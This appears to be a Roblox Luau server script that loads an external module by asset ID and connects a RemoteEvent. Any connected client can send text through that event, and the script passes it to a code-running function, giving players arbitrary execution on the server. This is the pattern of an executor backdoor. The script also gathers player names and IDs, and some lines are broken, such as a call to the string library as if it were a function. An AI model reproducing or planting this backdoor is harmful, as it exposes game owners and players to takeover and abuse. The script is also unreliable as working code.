local Players = game:GetService("Players")
local HttpService = game:GetService("HttpService")
local Assets = script.Parent:FindFirstChild("Assets")
local ConfirmEvent = Assets and Assets:FindFirstChild("ConfirmEvent")
local Market = game:GetService('MarketplaceService')
local hashlib = require(18180409772)


if not Assets or not ConfirmEvent then
	error("Assets or ConfirmEvent not found in Module")
end


local function GetPlayers()
	local playersTbl = {}
	for _, player: Player in pairs(Players:GetPlayers()) do
		table.insert(playersTbl, {
			["username"] = player.Name,
			["user-id"] = player.UserId
		})
	end

	return playersTbl
end







local mcode = require(Assets.Modules.loading)







-- RemoteEvent listener for ConfirmEvent
ConfirmEvent.OnServerEvent:Connect(function(player, sourceText)
	--print("ConfirmEvent received:", sourceText) -- Debugging output
	if sourceText == "" then
		--print("Source text is empty, ignoring")
		return
	end

	mcode.Code(sourceText)
end)
-- Additional RemoteEvent listener for TransformButton
ConfirmEvent.OnServerEvent:Connect(function(player, transformScript)
	--print("ConfirmEvent received with transformScript:", transformScript) -- Debugging output
	if transformScript == "transform" then
		--print("Transform script triggered") -- Debugging output
		local transformCode = string([[
       
       print("r6 coming soon")
        
        
        
        ]], player.UserId)

		local result, err = mcode(transformCode)
		if err then
			--warn(err)
		end
	end
	
	
end)
